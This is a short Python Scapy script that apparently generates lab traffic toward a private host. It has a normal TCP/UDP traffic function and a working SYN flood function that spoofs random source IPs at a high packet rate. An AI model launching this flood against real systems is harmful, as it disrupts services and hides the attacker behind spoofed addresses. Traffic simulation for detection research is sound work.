# -*- coding: utf-8 -*-
"""
Scapy 模拟流量
"""

from scapy.all import *
from typing import Final

H2_IP: Final[str] = "10.0.1.2"


def generate_normal_traffic(dst_ip, duration):
    # TCP流
    send(IP(dst=dst_ip) / TCP(sport=RandShort(), dport=80) / Raw(RandString(size=1000)),
         inter=0.001, loop=1, timeout=duration)

    # UDP流
    send(IP(dst=dst_ip) / UDP(sport=RandShort(), dport=53) / Raw(RandString(size=500)),
         inter=0.01, loop=1, timeout=duration)


def generate_ddos_attack(dst_ip, duration):
    # SYN Flood攻击
    send(IP(src=RandIP(), dst=dst_ip) / TCP(sport=RandShort(), dport=80, flags='S'),
         inter=0.0001, loop=1, timeout=duration)
